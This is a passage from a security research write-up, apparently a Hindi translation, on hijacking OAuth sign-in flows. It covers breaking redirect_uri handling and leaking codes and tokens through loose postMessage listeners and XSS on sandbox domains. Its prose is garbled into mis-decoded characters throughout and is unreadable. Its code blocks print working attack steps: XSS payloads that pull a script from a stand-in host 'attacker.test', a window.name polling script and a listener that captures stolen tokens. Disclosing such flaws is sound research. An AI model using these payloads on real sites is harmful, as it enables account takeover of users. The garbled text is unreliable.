рднреЗрдЬрдХрд░:
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХрд╛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ `https://example.com/callback?code=xxx&code=real-code` рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрдЧрд╛ред рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╛рдо рдХреЗ рдХрдИ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдпрд╣ рдПрдХ рдЧреИрд░-рд╣реИрдкреНрдкреА рдкрде рдХреЛ рднреА рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред `token` рдФрд░ `id_token` рдХреЗ рд▓рд┐рдП рднреА рдпрд╣реА рдмрд╛рдд рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИ:
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-рдпреВрдЖрд░рдЖрдИ рдХреЗ рдмрдЪреЗ рд╣реБрдП рдпрд╛ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

`redirect_uri`-рдорд╛рди рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рд╕рд╛рдЗрди-рдЗрди рдпреВрдЖрд░рдПрд▓реНрд╕ рдХреЛ рдЗрдХрдЯреНрдард╛ рдХрд░рддреЗ рд╕рдордп рдореИрдВ рдпрд╣ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддрд╛ рдерд╛ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреНрдп рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-рдпреВрдЖрд░рдЖрдИ рдорд╛рди рднреА рд╡реИрдз рдереЗред рдореИрдВрдиреЗ рдЬрд┐рди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдЯреЗрд╕реНрдЯ рдХрд┐рдпрд╛ рдерд╛, рдЙрдирдореЗрдВ рд╕реЗ 125 рдЕрд▓рдЧ-рдЕрд▓рдЧ Google рд╕рд╛рдЗрди-рдЗрди рдлреНрд▓реЛ рдореЗрдВ рд╕реЗ 5 рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рдкрд╛рд╕ рд╕реНрдЯрд╛рд░реНрдЯ рдкреЗрдЬ рднреА рдПрдХ рд╡реИрдз `redirect_uri` рдХреЗ рд░реВрдк рдореЗрдВ рдерд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ `redirect_uri=https://auth.example.com/callback` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рдерд╛, рддреЛ рдЗрди 5 рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХреЛрдИ рднреА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рднреА рд╡реИрдз рдереЗ:

* `redirect_uri=https://example.com/`
* `redirect_uri=https://example.com`
* `redirect_uri=https://www.example.com/`
* `redirect_uri=https://www.example.com`

рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд░реБрдЪрд┐рдХрд░ рдерд╛ рдЙрди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `id_token` рдпрд╛ `token` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ `response_type=code` рдЕрднреА рднреА OAuth-рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП OAuth-рдиреГрддреНрдп рдХреЗ рдЕрдВрддрд┐рдо рдЪрд░рдг рдореЗрдВ `redirect_uri` рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░реЗрдЧрд╛ред

## рдЧреИрдЬреЗрдЯ 1: рдХрдордЬреЛрд░ рдпрд╛ рдХреЛрдИ рдореВрд▓-рдЬрд╛рдВрдЪ postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдЬреЛ URL рд▓реАрдХ рдХрд░рддрд╛ рд╣реИ

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдЯреЛрдХрди/рдХреЛрдб рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдЕрдВрддрд┐рдо рдЧреИрд░-рдЦреБрд╢ рдкрде рдореЗрдВ рдПрдХ рдкреЛрд╕реНрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд░рд╣рд╛ рдерд╛ рдЬреЛ location.href рдХреЛ рд▓реАрдХ рдХрд░ рд░рд╣рд╛ рдерд╛ред**\
рдПрдХ рдЙрджрд╛рд╣рд░рдг рдПрдХ рд▓реЛрдХрдкреНрд░рд┐рдп рд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ-рдПрд╕рдбреАрдХреЗ рдерд╛ рдЬреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рд▓реЛрдб рд╣реЛрддрд╛ рдерд╛:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

рдЗрд╕ рдПрд╕рдбреАрдХреЗ рдиреЗ рдПрдХ postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдпрд╛ рдерд╛ рдЬреЛ рд╕рдВрджреЗрд╢-рдкреНрд░рдХрд╛рд░ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реЛрдиреЗ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рдерд╛:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

рдЗрд╕рд╕реЗ рдПрдХ рдЕрд▓рдЧ рдореВрд▓ рд╕реЗ рдЗрд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдирд╛:
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рдВрджреЗрд╢ рд╡рд┐рдВрдбреЛ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ `location.href` рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╕рдВрджреЗрд╢ рд╣реЛрдЧрд╛:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлреНрд▓реЛ рдХрд╛ рдЖрдзрд╛рд░ рдХреЛрдб рдФрд░ рдЯреЛрдХрди рдХреЗ рдЙрдкрдпреЛрдЧ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рдерд╛, рд▓реЗрдХрд┐рди рд╡рд┐рдЪрд╛рд░ рдпрд╣ рдерд╛:

### **рд╣рдорд▓рд╛**

1. рд╣рдорд▓рд╛рд╡рд░реНрддреА рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдПрдХ **рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП рд▓рд┐рдВрдХ** рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ OAuth-рдбрд╛рдВрд╕ рдореЗрдВ **рдЦреБрд╢ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкрде** рдореЗрдВ рдкрд░рд┐рдгрд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
2. рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ **рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ** рдХрд░рддрд╛ рд╣реИред рдирдпрд╛ рдЯреИрдм рдЦреБрд▓рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ OAuth-рдкреНрд░рджрд╛рддрд╛ рдореЗрдВ рд╕реЗ рдПрдХ рдХреЗ рд╕рд╛рде рдПрдХ **рд╕рд╛рдЗрди-рдЗрди** рдлреНрд▓реЛ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
3. рдЦреБрд╢ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкрде рдХреЛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдКрдкрд░ рдЦреБрджрд░рд╛ postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓рд╛ рд▓рд┐рд╕реНрдЯрдирд░ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рд╡рд┐рдХреНрдЯрд┐рдо рдиреЗ рдЙрд╕ рдкреГрд╖реНрда рдкрд░ рдЬрд╣рд╛рдВ рдкрд╣реБрдВрдЪрд╛ рд╣реИ, рдЕрдм рднреА рдХреЛрдб рдпрд╛ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде URL рдореЗрдВред
4. рд╣рдорд▓рд╛рд╡рд░реНрддреА рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЯреИрдм** рдирдП рдЯреИрдм рдХреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд╕рд╛рде рдХрдИ **рдкреЛрд╕реНрдЯ-рд╕рдВрджреЗрд╢** рднреЗрдЬрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреЛрд╕реНрдЯ-рд╕рдВрджреЗрд╢-рд╕реБрдирдиреЗ рд╡рд╛рд▓рд╛ рд╡рд░реНрддрдорд╛рди URL рдЫрд┐рдбрд╝рдХрд╛рд╡ рдХрд░ рд╕рдХреЗред
5. рд╣рдорд▓рд╛рд╡рд░реНрддреА рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЯреИрдм рдлрд┐рд░ **рдЙрд╕реЗ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдХреЛ рд╕реБрдирддрд╛ рд╣реИ**ред рдЬрдм URL рдПрдХ рд╕рдВрджреЗрд╢ рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддрд╛ рд╣реИ, рддреЛ рдХреЛрдб рдФрд░ рдЯреЛрдХрди **рдирд┐рдХрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЛ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
6. **рд╣рдорд▓рд╛рд╡рд░реНрддреА рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдЦреБрд╢ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкрде рдкрд░ рдЕрдВрдд рдореЗрдВ рдкрд╣реБрдВрдЪрд╛ рд╣реИ, рдХреЛрдб рдпрд╛ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

## рдЧреИрдЬреЗрдЯ 2: URL рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕/рддреГрддреАрдп-рдкрдХреНрд╖ рдбреЛрдореЗрди рдкрд░ XSS

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **рдЧреИрдЬреЗрдЯ 2: рдЙрджрд╛рд╣рд░рдг 1, рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЖрдЗрдлреНрд░реЗрдо рд╕реЗ window.name рдЪреЛрд░реА рдХрд░рдирд╛**

рдЗрд╕рдореЗрдВ **рдЖрдЗрдлреНрд░реЗрдо** рдерд╛ рдЬреЛ **OAuth-рдбрд╛рдВрд╕ рдХрд╛ рдЕрдВрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреГрд╖реНрда** рдкрд░ рд▓реЛрдб рд╣реЛрддрд╛ рдерд╛ред **рдЖрдЗрдлреНрд░реЗрдо** рдХрд╛ **рдирд╛рдо** рдПрдХ **JSON-рд╕реНрдЯреНрд░рд┐рдВрдЧреАрдХреГрдд рд╕рдВрд╕реНрдХрд░рдг** рдерд╛ рдЬреЛ `window.location` рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдерд╛ред рдпрд╣ рдбреЗрдЯрд╛ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдкрд░ рдбреЗрдЯрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдкреБрд░рд╛рдирд╛ рддрд░реАрдХрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдЗрдлреНрд░реЗрдо рдореЗрдВ рдкреЗрдЬ рдЕрдкрдиреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП `window.name` рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget2-example2.png)

рдЖрдИрдлреНрд░реЗрдо рдореЗрдВ рд▓реЛрдб рдХрд┐рдП рдЧрдП рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╕рд░рд▓ XSS рднреА рдерд╛:
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### рд╣рдорд▓рд╛

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдбреЛрдореЗрди рдкрд░ **XSS** рд╣реИ, рддреЛ рдпрд╣ рд╡рд┐рдВрдбреЛ рдлрд┐рд░ рдЙрд╕реА рдореВрд▓ рдХреЗ рдЕрдиреНрдп рд╡рд┐рдВрдбреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИ рдпрджрд┐ рд╡рд┐рдВрдбреЛрдВ рдХреЗ рдмреАрдЪ рдорд╛рддрд╛ / рдкреБрддреНрд░ / рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓реЗ **рд╕рдВрдмрдВрдз** рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ XSS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдЯреИрдм рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд░рд╛рдлреНрдЯреЗрдб **OAuth рд▓рд┐рдВрдХ** рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЖрдХреНрд░рдордгрдХрд╛рд░реА рдХреЛ рд╕рдВрднрд╡ рд╣реЛрдЧрд╛ рдЬреЛ **рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдкрде рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛**ред рдлрд┐рд░, XSS рдЙрддреНрдкрдиреНрди рд╣реБрдП рдкреГрд╖реНрда рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрдЧрд╛ рдХрд┐ рдЖрдИрдлреНрд░реЗрдо рдХрд╛ рдирд╛рдо рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХреЗ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдорд╛рддрд╛ рдкреГрд╖реНрда рдкрд░ рдПрдХ рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░реВрдк рд╕реЗ:

1. рдПрдХ рджреБрд╖реНрдЯ рдкреГрд╖реНрда рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ XSS рдХреЗ рд╕рд╛рде рдореЗрд░реЗ рдЕрдкрдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдЖрдИрдлреНрд░реЗрдо рд╢рд╛рдорд┐рд▓ рд╣реИ:

```html
<div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
x=createElement('script'),
x.src='//attacker.test/inject.js',
document.body.appendChild(x);"
style="border:0;width:500px;height:500px"></iframe></div>
```
2. рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдореЗрд░реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдореИрдВрдиреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЗ рд╕рд╛рде рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрджрд▓ рджрд┐рдпрд╛:

```javascript
document.body.innerHTML =
'<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

рдореИрдВрдиреЗ рдПрдХ рдЕрдВрддрд░рд╛рд▓ рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреА рд╢реБрд░реВ рдХрд┐рдпрд╛ рдерд╛ рдЬреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд▓рд┐рдВрдХ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдореИрдВ рдЬрд┐рд╕ рдЖрдИрдлреНрд░реЗрдо рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛, рд╡рд╣рд╛рдВ `window.name` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкреГрд╖реНрда рдкрд░ рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдореВрд▓ рдХреЗ рд╕рд╛рде рд╣реИ:

```javascript
x = setInterval(function() {
if(parent.window.b &&
parent.window.b.frames[0] &&
parent.window.b.frames[0].window &&
parent.window.b.frames[0].window.name) {
top.postMessage(parent.window.b.frames[0].window.name, '*');
parent.window.b.close();
clearInterval(x);
}
}, 500);
```
3. рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдлрд┐рд░ рд╕реЗ рдЙрд╕ рд╕рдВрджреЗрд╢ рдХреЛ рд╕реБрди рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЕрднреА `window.name` рдХреЗ рд╕рд╛рде рднреЗрдЬрд╛ рд╣реИ:

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'We stole the token: ' + e.data;
}
});
</script>
```

## **рдЧреИрдЬреЗрдЯ 2: рдЙрджрд╛рд╣рд░рдг 2, XSS рдХреЗ рд╕рд╛рде рдЖрдИрдлреНрд░реЗрдо + рдореВрд▓ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреА рдЬрд╛рдВрдЪ**

рджреВрд╕рд░рд╛ рдЙрджрд╛рд╣рд░рдг рдПрдХ **рдЖрдИрдлреНрд░реЗрдо** рдерд╛ рдЬреЛ **рдЦреБрд╢ рдирд╣реАрдВ рд░рд╛рд╕реНрддрд╛** рдкрд░ рд▓реЛрдб рд╣реБрдЖ рдерд╛ рдФрд░ рдПрдХ XSS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ **postMessage рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ**, рд▓реЗрдХрд┐рди **рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ `parent` рд╕реЗ рдЕрдиреБрдорддрд┐ рдереА** рдЬреЛ рдЗрд╕реЗ рд▓реЛрдб рдХрд░рддрд╛ рдерд╛ред рдЬрдм рдпрд╣ `initConfig` рдХреЗ рд▓рд┐рдП `parent` рд╡рд┐рдВрдбреЛ рдХреЛ рд╕рдВрджреЗрд╢ рдореЗрдВ `location.href` рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдЖрдИрдлреНрд░реЗрдо рдХреЛ рдиреАрдЪреЗ рднреЗрдЬ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рдиреЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЖрдИрдлреНрд░реЗрдо рд▓реЛрдб рдХрд┐рдпрд╛:
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
рдФрд░ рд╕рд╛рдордЧреНрд░реА рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддреА рдереА (рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рд╕реЗ рдмрд╣реБрдд рд╕рд░рд▓реАрдХреГрдд рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдорд▓реЗ рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭрд╛рдиреЗ рдХреЗ рд▓рд┐рдП):
```html
<script>
window.addEventListener('message', function (e) {
if (e.source !== window.parent) {
// not a valid origin to send messages
return;
}
if (e.data.type === 'loadJs') {
loadScript(e.data.jsUrl);
} else if (e.data.type === 'initConfig') {
loadConfig(e.data.config);
}
});
</script>
```
### рд╣рдорд▓рд╛

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ iframe рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ Post-message XSS vuln рдкреЗрдЬ рд╣реЛрддрд╛ рд╣реИ**, рдФрд░ **XSS рдХрд╛ рд╢реЛрд╖рдг** рдХрд░рдХреЗ **рдЕрдирд┐рдпрдорд┐рдд JS рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ**ред
рдпрд╣ **JS** рдПрдХ **рдЯреИрдм рдЦреЛрд▓реЗрдЧрд╛** рдЬрд┐рд╕рдореЗрдВ **OAuth рд▓рд┐рдВрдХ** рд╣реЛрдЧрд╛ред рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдВрддрд┐рдо рдкреЗрдЬ рдореЗрдВ URL рдореЗрдВ рдЯреЛрдХрди рд╣реЛрдЧрд╛ рдФрд░ рдПрдХ iframe (XSS post-message vuln iframe) рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рдлрд┐рд░, **рдЕрдирд┐рдпрдорд┐рдд JS** (рд╢реЛрд╖рд┐рдд XSS рд╕реЗ) рдореЗрдВ рдПрдХ **рдУрдкрдирд░ рдЯреИрдм рд╣реЛрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдпрд╣ **iframe рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ** рдФрд░ рдЗрд╕реЗ **рдорд╛рддрд╛-рдкрд┐рддрд╛ рд╕реЗ `initConfig` рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ** (рдЬрд┐рд╕рдореЗрдВ рдЯреЛрдХрди рд╡рд╛рд▓рд╛ URL рд╣реЛрддрд╛ рд╣реИ)ред рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреЗрдЬ рдЗрд╕реЗ iframe рдХреЛ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЗрд╕реЗ **рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЖрджреЗрд╢ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдореИрдВ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рдПрдХ рд╕рдорд╛рди рддрд░реАрдХрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ:

1. рдПрдХ **рдЦрддрд░рдирд╛рдХ рдкреЗрдЬ рдмрдирд╛рдПрдВ** рдЬрд┐рд╕рдореЗрдВ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХрд╛ рдПрдХ **iframe рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрддрд╛ рд╣реИ**, рдФрд░ рдЬрдм рдЗрд╕ iframe рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ **рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП onload рд▓рдЧрд╛рдПрдВ**ред

```html
<div id="leak"><iframe
id="i" name="i"
src="https://challenge-iframe.example.com/"
onload="run()"
style="border:0;width:500px;height:500px"></iframe></div>
```

2. рдХреНрдпреЛрдВрдХрд┐ **рдЦрддрд░рдирд╛рдХ рдкреЗрдЬ рдлрд┐рд░ рдЗрд╕ iframe рдХрд╛ рдорд╛рддрд╛-рдкрд┐рддрд╛ рд╣реЛрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдпрд╣ **postMessage (XSS)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдореЗрдВ рд╣рдорд╛рд░реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ iframe рдХреЛ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ:

```html
<script>
function run() {
i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
}
</script>
```

3. рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рд▓реЛрдб рд╣реЛ рд░рд╣реА рдореЗрд░реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдореИрдВрдиреЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдкреАрдбрд╝рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛**:

```javascript
document.body.innerHTML = '<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

